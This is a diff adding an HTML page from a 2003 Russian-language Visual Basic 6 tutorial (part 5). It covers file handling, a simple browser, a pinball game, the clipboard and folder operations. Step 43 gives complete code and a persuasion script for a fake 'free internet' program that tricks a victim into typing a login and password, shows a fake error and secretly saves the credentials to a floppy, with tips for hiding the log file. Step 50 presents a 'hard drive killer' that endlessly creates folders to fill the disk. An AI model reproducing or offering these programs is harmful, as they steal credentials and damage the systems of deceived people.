@@ -1,0 +1,478 @@
+
+
+
+<html><head>
+<style type="text/css">
+.part2{color:#4173a3;font-weight:900;}
+.part2:hover{color:red;font-weight:880}
+.cd{font-size:18px;color:black;}
+.c2{font-size:18px;color:black;}
+.c1{font-size:45pt;}
+.cc{font-size:13pt;font-weight:bold}
+.t{color:red;}
+.a9{color:#4173a3;font-weight:bold;}
+.a9:hover{color:red;font-weight:880}
+h2{font-size:21pt;font-weight:bold}
+h3{font-size:17pt;font-weight:bold}
+.a19{color:#4173a3;font-size:18px}
+.a19:hover{color:red;font-size:18px}
+body{
+BORDER-RIGHT: 0px;
+SCROLLBAR-FACE-COLOR: #CFDEEB;
+PADDING-BOTTOM: 0px;
+SCROLLBAR-HIGHLIGHT-COLOR: #CFDEEB;
+VERTICAL-ALIGN: middle;
+BORDER-LEFT: 0px;
+SCROLLBAR-SHADOW-COLOR: black;
+SCROLLBAR-ARROW-COLOR: black;
+PADDING-TOP: 0px;
+BORDER-BOTTOM: 0px;
+SCROLLBAR-BASE-COLOR: black;
+scrollbar-3dlight-color: #4173a3;
+scrollbar-dark-shadow-color: #4173a3;}
+</style>
+
+<title>Программируем на Visual Basic'e</title>
+</head>
+<body background="1.jpeg">
+<em >
+<a href="http://vbstreets.narod.ru" class="a9">Главная</a>
+<a href="http://gb.lpt.ru/gb.php?bid=7132" class="a9">Гостевая</a>
+<a href="http://gb.lpt.ru/gb.php?bid=7137" class="a9">Форум</a>
+<a href="INFA.htm" class="a9">INFA</a>
+</em>
+
+<H1 ><font size=6>Программируем на Visual Basic'e:</font></H1>
+
+<p style="font-weight:bold; font-size:21px" >
+
+<a href="vbasic.htm" class="part2">Часть 1</a>/<a href="vbasic2.htm" class="part2">Часть 2</a>/<a href="vbasic3.htm" class="part2">Часть 3</a>/<a href="vbasic4.htm" class="part2">Часть 4</a>/Часть 5/<a href="vbasic6.htm" class="part2">Часть 6</a>/<a href="vbasic7.htm" class="part2">Часть 7</a>/<a href="vbasic8.htm" class="part2">Часть 8</a>/<a href="vbasic9.htm" class="part2">Часть 9</a>/<a href="vbasic10.htm" class="part2">
+Часть 10</a>  /<a href="vbasic11.htm" class="part2">Часть 11</a>/<a href="vbasic12.htm" class="part2">Часть 12</a>/<a href="vbasic13.htm" class="part2">Часть 13</a>
+
+/<a href="vbasic14.htm" class="part2">Часть 14</a>/<a href="vbasic15.htm" class="part2">Часть 15</a>
+</font>
+
+
+
+
+
+
+
+
+
+<h2>ШАГ 41:</h2><h3>Открытие файлов<br></h2><p class="c2">
+
+Сегодня я тебе расскажу про работу с файлами и папками.<br>Чтобы открыть файл тебе надодо использовать функцию Shell. Открываем файл: <br>r = Shell("start c:\scandisk.log", vbHide)<br>
+Короче как ты наверное, догадался тебе надо написать:<br> любой символ = Shell("start имя файла и путь",vbHide)<br>
+
+
+
+
+<h2>ШАГ 42:</h2><h3>Работа с файлами:<br></h2><p class="c2">
+В этом разделе я тебе начну говорить о файлах,  верней не о них, а как с ними работать, т.е.
+открывать, изменять, кидать... <br>
+<b>Открытие:</b>
+Для начала я хотел бы тебе сказать одну штуку, для того чтобы тебя не запутать, это не то открытие, о котором говорится на 41 шаге, а это не видимое открытие, т.е. юзер не будет видеть это окно. Вот так это делается:<br>
+f = FreeFile <font color="green"> ' Функция FreeFile возвращает номер свободного канала, который можно использовать для работы с файлом, короче его надо всегда писать, но место него можно написать #номер<br></font>
+Open Имя_файла For [Input \ Output \ Append] As f
+
+<font color="green"> 'Открываем файл<br></font>
+Close f<font color="green"> 'Закрываем файл<br></font>
+<br><br>
+Здесь Имя файла это путь к файлу. Посдле оператора For идет три слова:<br>
+<b>Input</b> - Это означает, что файл открывается только для чтения, если файл не существует, то VB выдаст ERROR.<br>
+<b>Output</b> - файл открывается для записи, если в файле есть какой - нибудь текст, то этот текст удаляется, если файл не существует, то он создается.<br>
+<b>Append</b> - файл открывается для записи, текст в нем не удаляется, а добавляется, если файл не существует то он создается.<br>
+Потом идет ключевое слово As, после него надо указать переменную f(FreeFile).И наконец, закрываем файл(Close), только не пробуй копировать код в VB, у тебя все равно ничего не выйдет, т.к. открытие файла нужно для чтения текста, или его изменения, а об этом читай ниже.
+<br><b>Запись:</b><br>Для записи текста служит оператор print(и write)<br>
+f = FreeFile <font color="green">'Возвращает номер свободного канала<br></font> 
+Open "c:\1.txt" For Append As f<font color="green"> 'Открываем файл для добавления записи<br></font> 
+Print #f, "Твой ТЕКСТ"<font color="green">'Записываем в файл 1.txt текст <br></font> 
+Close #f <font color="green">'Закрываем файл<br></font> 
+<br>
+<b>Чтение</b>
+<br>Для чтения файла надо использовать оператор LOF.<br><br>
+f = FreeFile<br>
+Open "c:\1.txt" For Input As f<br>
+Text1.Text = Input(LOF(f), f)<font color="green"> 'Считываем текст из открытого файла в текстовое поле<br></font>
+Close f<br>
+Если ты думаешь, что это ни фига не надо, то я хочу тебе сказать что ты не прав, любое проффисиональное приложение использует эту феньку. И для того чтоб показать тебе все прелести работы с файлами делаем прогу: Разводка ламеров. Халявный инет.
+<h2>ШАГ 43:</h2><h3>Развод ламеров. Халявный инет.<br></h2><p class="c2">
+Вся радость в том, что ламер будет думать что он дурит провайдера, а на самом деле будут дурить его. Хе - Хе. Ламер сам напишет тебе пароль, и скинет тебе его на дискету. Ты дашь ему прогу, и скажешь, что эта прога нужна для того чтоб в инете на халяву сидеть. Он спросит: “ а у тебя получилось", ты ему скажешь: "Да, конешно работает, а если не работала, то я тебе ее не дал бы"... Ну для большей убедительности расскажешь ему о ней (речь сам придумаешь). Он впишет свой пароль и логин, и комп сохранит их на дискету. Учитывается то, что ламер будет вводить в начале не свой пароль, но это неважно, когда - нибудь он свой введет, и все его записи сохранятся на дискете, потом ты придешь домой, проверишь все его записи, и по какой - нибудь войдешь. 
+
+<br>Ну что начнем? На форму кидаем 2 кнопки,2 текстовых поля,3 метки, ну и сделаем меню для большей убедительности. У первой кнопки свойство Caption будет Ввод, у второй Выход; у текстовых полей убираем свойство Text; у первой метки свойство Caption будет Password, у второй Login, а у 3 Халявный Интернет; у меню сделаем 2 раздела, первый раздел по традиции свойство Caption будет файл, а у второго Справка. У первого раздела первого подраздела свойство Caption будет выход, а у второго раздела, первого подраздела свойство Caption будет Вызов справки, а у второго подраздела О программе. Да чуть не забыл, нам надо добавить еще одну форму, для этого нажми на Add Form, эта фенька находится около кнопки создание меню, под разделом Edit. Короче у тебя должна получиться такая фенька:
+
+<br><img src="24.jpg">
+
+
+
+
+
+Private Sub Command1_Click()<font color="green"> 'При нажатии на кнопку Ввод:<br></font>
+MsgBox "Не установлено соединение или неправильно введен пароль", 48, "Ошибка при соединение"<font color="green"> 'Появится ошибка, с сообщением о неправильных действиях ламера, если ламер введет не правильный (или правильный) пароль и логин, то появится ощибка, и когда - нибудь он введет правильный...<br></font>
+d = FreeFile<br>
+Open "a:\1.txt" For Append As d<font color="green"> 'Открываем файл для записи, в него будут записываться данные ламера. Стоит диск a:, это для того чтоб привязать прогу к дискете, и тогда ламер не сможет скинуть ее себе на комп, и когда он отдаст тебе дискету, ты прочтешь все его записи.<br></font>
+Print #d, Text1.Text; Tab; Text2.Text<font color="green"> 'Записываем данные, которые ламер введет в текстовые поля<br></font>
+Close #d<font color="green"> 'Закрываем файл<br></font>
+End Sub<br><br>
+
+Private Sub Command2_Click()<font color="green"> 'При нажатии на кнопку 2:<br></font>
+End<font color="green"> 'Выходим из проги, можно и с помощью Unload Me<br></font>
+End Sub<br>
+Private Sub ав_Click()<br>
+End<font color="green"> 'При выборе Файл/Выход прога отрубается:<br></font>
+End Sub<br>
+<br>
+Private Sub см_Click()<font color="green"> 'При нажатии на кнопку 3(О проге):<br></font>
+Form2.Show<font color="green"> 'Показываем Form2<br></font>
+End Sub<br>
+
+<br>
+Теперь займемся оформлением Формы 2.На форму 2 закинем 4 метки: У первой свойство Caption будет О проге. У второй будет: "Программа ломает твоего провайдера, через порт TCP/IP; за каждый заход тебе на карту зачисляется 0.25 y.e.,  это оптимальная сумма для всех карт. Например, у MTU можно снять за раз 0.27 y.e., а у ROL 0.33 y.e.,  это зависит от скорости   обновления сервера. После нажатия на Ввод появится сообщение о успешном взломе, и в течение 3 минут постарайтесь выйти из интернета. Где - то через 10 - 15 мин. опять можете повторять операцию.". У третьей: "Автор проекта не несет ни какой ответственности за использование проги", и эту метку надо сделать красным цветом. У четвертой: "Дата создания: 10/07/02".У пятой: "Автор: Падре". Все это нужно для большей убедительности. У тебя должна получиться такая фенька.<br><img src ="24.1.jpg"><br>Ну вот и все!!! Теперь подсунь ее какому - нибудь ламеру. Не забудь скрыть текстовой файл, можешь поменять ему расширения, например записать не 1.txt, 1.lamer, и тогда ламер не додумается его открыть, даже если его найдет. А ты сможешь открыть его, если кликнешь на него два раза, и в открывшимся окне "Открыть с помощью", выбери Noterpad(Блокнот)
+
+
+
+
+
+
+Исходник проги можешь скачать  <a href="vb10.zip"class="a19">отсюда</a>
+
+
+
+
+<h2>ШАГ 44:</h2><h3>Делаем Cвой Инет Броузер:<br></h2><p class="c2">
+Ну как я и обещал, будем делать свой инет броузер. Подключи компонент Microsoft Internet Controls. На форму кинь WebBrowser(назови его WB), 4 кнопки(у 1ой Caption = "Назад", у 2ой = "Вперед", у 3ей = "Домой", у 4ой = "Обновить"), метку(Caption = "Адрес:", AutoSize = True(это чтоб размеры метки регулировались автоматом)), и текстовое поле(Caption="http://"). Вот что у тебя должно было появиться:<br><br>
+<img src="WB.jpg"><br><br>
+
+
+
+
+
+Private Sub Command1_Click() <font color="green"> 
+' Кнопка назаD<br></font>
+WB.GoBack<br>
+End Sub<br>
+<br>
+Private Sub Command2_Click() <font color="green"> ' Кнопка вперед<br></font>
+WB.GoForward<br>
+End Sub<br>
+<br>
+Private Sub Command3_Click() <font color="green"> ' Кнопка Домой<br></font>
+WB.GoHome<br>
+End Sub<br>
+<br>
+Private Sub Command4_Click() <font color="green"> ' Кнопка Обновить<br></font>
+WB.Refresh<br>
+End Sub<br>
+<br>
+Private Sub Form_Resize()<font color="green"> ' При изменении размера формы меняем размер WB<br></font>
+WB.Left = 20<br>
+WB.Top = 1080<br>
+WB.Width = Form1.Width - 140<br>
+WB.Height = Form1.Height - 1500<br>
+End Sub<br>
+<br>
+Private Sub Text1_KeyDown(KeyCode As Integer, Shift As Integer)<br>
+If KeyCode = 13 Then<font color="green"> ' Если нажата клавиша Enter то:<br></font>
+WB.Navigate Text1.Text <font color="green"> ' Открываем введенный в текстовое поле адресс<br></font>
+
+<font color="green"> ' Меняем заголовок формы<br></font>
+Form1.Caption = ""<br>
+Form1.Caption = Text1.Text & Form1.Caption<br>
+End If<br>
+End Sub<br>
+<br>
+
+
+
+
+
+
+
+
+
+
+
+Исходник проги качай <a href="WB.zip"class="a19">сдесь</a>
+
+
+
+<h2>ШАГ 45:</h2><h3>Делаем PineBall:<br></h2><p class="c2">
+
+На форму кинь кнопку(Enabled = False), Picture(Enabled = False, AutoSize = True, BorderStyle = "0 - None"), Timer(Interval = 1). Вот что у тебя должно получиться:<br>
+<img src="PineBall.jpg"><br>
+Вот код:<br><br>
+
+
+
+
+
+
+
+
+
+
+
+Dim BallTop As Boolean 
+<font color="green"> 'Тип Boolean озночает то что переменная может принемать тока 2 значения True и False<br></font>
+
+
+Dim Q As Boolean, Q1 As Boolean<br>
+
+<br>
+Private Sub Form_KeyDown(KeyCode As Integer, Shift As Integer)<br>
+
+<font color="green"> ' если нажата кнопка "вправо", то бита едет вправо<br></font>
+
+
+If KeyCode = 39 Then<br>
+Bita1.Left = Bita1.Left + 120<br>
+End If<br>
+
+<font color="green"> ' если нажата кнопка "влево", то бита едет влево<br></font>
+
+If KeyCode = 37 Then<br>
+Bita1.Left = Bita1.Left - 120<br>
+End If<br>
+End Sub<br>
+<br>
+
+Private Sub Timer1_Timer()<br>
+If BallTop = False Then 
+<font color="green"> ' Если BallTop = False то шар скачет вниз<br></font>
+
+
+Ball.Top = Ball.Top + 30<br>
+
+
+Else <font color="green"> 'Если BallTop = True то шар едет вверх<br></font>
+Ball.Top = Ball.Top - 30<br>
+End If<br>
+<br>
+If Ball.Left - Bita1.Left < 150 And Ball.Left - Bita1.Left > -320 And Bita1.Top <= Ball.Top + 300 Then
+
+<font color="green">  ' Сдесь начало вроде понятно, а в конце я написал Ball.Top + 300 это чтоб мяч ударялся об верх биты<br></font>
+
+BallTop = True
+
+<font color="green">  ' Пускаем шар вверх<br></font>
+
+Q = True 
+
+<font color="green"> '' И влево<br></font>
+
+End If<br>
+If Q = True Then
+
+<font color="green">  ' Если Q = True то мяч скачет влево<br></font>
+
+Ball.Left = Ball.Left - 60<br>
+End If<br>
+If Q1 = True Then 
+
+<font color="green"> ' Если Q1 = True то мяч скачет влево<br></font>
+
+Ball.Left = Ball.Left + 60<br>
+End If<br>
+<br>
+
+If Ball.Left <= 0 Then 
+
+<font color="green"> ' Если мяч ударяется об левую стенку то меняем его направление<br></font>
+
+Q = False<br>
+Q1 = True<br>
+End If<br>
+End Sub<br>
+<br>
+
+
+
+Эту прогу сам доделай, а то скопировать код любой может(даже я :-)), а вот до делать...<br>
+
+
+
+Исходник проги качай <a href="PineBall1.zip"class="a19">сдесь</a>
+
+
+
+
+
+
+
+
+
+<h2>ШАГ 46:</h2><h3>Работа с Буфером ОБМЕНА<br></h2><p class="c2">
+
+
+    
+<p class="c2" text-align=right>
+Очень часто на конференция встречаются вопросы типа:
+        &quot;Как поместить текст в
+        Clipboard?&quot;. Специально для этого
+        существует объект Clipboard. C
+        помощью этого маленького
+        примера я коротко покажу как
+        просто можно с ним
+        взаимодействовать.<p class="c2">1.Создайте
+        стандартный проект.        <br>2.Создайте
+        тестовое поле Text1.       <br>3.Создайте
+        три кнопки с именами cmdCut, cmdCopy и
+        cmdPaste, и соответственно надписи к
+        ним: &quot;Cut&quot;, &quot;Copy&quot;,
+        &quot;Paste&quot;. <br>4.Кликните
+        два раза на cmdCut (кнопка, которая
+        будет вырезать текст) -
+        откроется окно Code. Впишите:</font> 
+      <p class="c2"><font color="#000099" >Private Sub</font> cmdCut_Click()</font>
+        <br>
+        <font color="#006600" >
+        'Вобще - то команды
+        &quot;вырезать&quot; нет - есть
+        положить в буфер, <br>
+        
+        'а потом надо просто удалить то,
+        что мы скопировали. <br>
+        'как известно чтобы что-то
+        вырезать или вставить нужно
+        это выделить.<br>
+       
+        'функция Text1.SelText возвращает
+        именно выделенный текст, итак
+        <br>
+        'в буфер обмена помещается всё,
+        что выделено</font> <br>
+        Clipboard.SetText Text1.Text</font> <br>
+        <font color="#006600" >
+        'теперь выделенный фрагмент
+        текста удаляется</font><br> 
+        Text1.SelText = &quot;&quot;</font> <br>
+        <font color="#000099" >End
+        Sub</font> <br>
+        5.Теперь
+        откройте окошко выбора (сверху
+        окна Code) и выберете событие cmdCopy
+        - заполним кнопку Copy:<p class="c2">
+        <font color="#000099" >Private Sub</font>cmdCopy_Click()
+        <br>
+        <font color="#006600" >
+        'здесь всё тоже, что и выше, но
+        выделенный фрагмент не
+        удаляется</font> <br>
+        Clipboard.SetText Text1.Text <br>
+        <font color="#000099" >End
+        Sub</font> <p class="c2">
+        6.
+        Теперь выберите событие кнопки
+        Paste (&quot;Вставить&quot;) и впишите:
+        <font color="#000099" >Private Sub </font>cmdPaste_Click()
+        <br>
+        <font color="#006600" >    
+        'текстовому полю присваивается
+        содержимое буфера обмена</font> <br>
+
+        Text1.Text = Text1.Text + Clipboard.GetText <br>
+        <font color="#000099" >End
+        Sub</font> 
+        <p class="c2">И всё!
+        А чтобы проводить подобные
+        операции с графикой нужно
+использовать методы GetData и SetData, но об этом потом. Все потом. А сейчас я дам тебе ЗАДАНИЕ. Ну что, испугался? Ну и правильно, ща тебе придется попотеть!!!</font></p>
+<h2>ШАГ 47:</h2><h3>Задание:<br></h2><p class="c2">
+Я тебя готовил к этому на протяжении 4 частей, и подготовил. Твоя миссия будет заключаться в создании блокнота, да не просто блокнота, а Чудо Блокнота. Короче ты должен нанести тяжелый удар по Microsoft, чтоб они затрепищали...
+Ты должен сделать обычный блокнот, но с часами (до этого даже Билл Гейц не додумался:-))). Потом отправляешь его
+в компанию Microsoft, получаешь бабло, и 50% отдаешь мне. Ну что договорились? Отлично! Только бабки присылай НЕ ЧЕКОМ, а наличкой....
+<h2>ШАГ 48:</h2><h3>Создание папок<br></h2><p class="c2">
+Для создания папок есть функция MKDir
+<br>
+MkDir "c:\44" <font color="#006600" >    
+        'Создаем папку 44</font><br>
+Теперь потготовились к созданию проги "Убийца Винта"
+
+
+<h2>ШАГ 49:</h2><h3>Удаление & Копирование & Перемещение & Переименование файлов<br></h2><p class="c2">
+Вот я сижу перед своим компом, делать не фига, играть невчего, Цой чего - то поет
+, но из - за того что у меня стремные колонки не фига не разберешь (помойму Группа крови), и я решил продолжить 
+свою писанину. А что касается VB7, о которой я обещал узнать - все засекречено. Злой дядька Билл 
+Гейц не говорит дату выпуска, он сказал мне только то, что VB7 станет объектно - оринтерировочным, 
+и что в нем можно будет делать на уровне предприятий WEB приложения. Появится очень много и другого, я сидел два часа читал перевод статьи, и то не дочитал, и вот я не знаю покупать мне VB6, или подождать
+выхода VB7. Ну ладно перейдем к делу. 
+
+<hr>Для удаления файлов служит функция Kill "имя файла"
+<br>
+Kill "c:\1.txt"
+ <font color="#006600" >    
+        'Удаляем файл 1.txt</font><br>
+<hr>
+Для копирования файлов есть функция FileCopy "дирек1","дирек2"
+<br>FileCopy "c:\1.txt", "c:\1\1.txt"<font color="#006600" >    
+        'Копируем файл 1.txt из c:\ в c:\1\</font>
+<hr>
+
+Для перемещения файлов Злой Дядька Билл Гейц сделал функцию Name "дирек1\Имя файла" as "дирек2\Имя файла"
+<br>
+
+Name "c:\1.bmp" As "c:\1\1.bmp"<font color="#006600" >    
+        'Перемещаем файл 1.BMP из диска c:\ в c:\1.bmp</font><br>
+
+<hr>
+Переименование файлов делается также как и перемещение. <br>
+Name "c:\1.bmp" As "c:\22.bmp"<font color="#006600" >    
+        'Переименовываем файл 1.bmp в 22.bmp</font><br>
+
+
+
+<h2>ШАГ 50:</h2><h3>Делаем Убийцу Винта<br></h2><p class="c2">
+
+
+
+
+
+Dim bDIR As Integer<font color="#006600" > ' вводим переменную bDIR</font><br>
+Private Sub Form_Load()<br>
+bDIR = 0<br>
+End Sub<br>
+Private Sub Timer1_Timer()<br>
+On Error Resume Next<font color="#006600" > ' при ошибке переходим к следующему, а следующее это тоже самое</font><br>
+
+MkDir "C:\Создано " & bDIR & " папок" <font color="#006600" > ' создаем папки</font><br>
+
+
+bDIR = bDIR + 1<font color="#006600" > ' добавляем в конец имени папки номер, всегда больший предыдущего на один</font><br>
+
+End Sub
+
+
+
+
+
+<br><br>
+Если у тебя есть вопросы по этой части, то 
+оставляй их на форуме, гостевой книге, или пиши в наглую на мыло: <a href="mailto:padre03@mail.ru" class=a19>padre03@mail.ru</a>. 
+
+<br><br>
+<br>
+<a href="vbasic6.htm"class="a19">Шестая часть</a><br><br>
+<em><p class="cc">автор учебника: Падре</em>
+<br>
+Дата создания: 9 Марта 2003 года
+<br>
+
+<center>
+<table width=468 height=60 border=2 bordercolor="#4173a3"><td  bordercolor="#4173a3"><center>
+<p class="c2">Место под Банеры
+</td>
+<tr><td>
+<center>
+<a href="http://www25.brinkster.com/msvbasic" target="0">
+<img src="Evgeniy.gif" alt="MS Visual Basic" border=0>
+</a></center>
+</td></table>
+
+
+
+
+
+
+</body>
+</html>
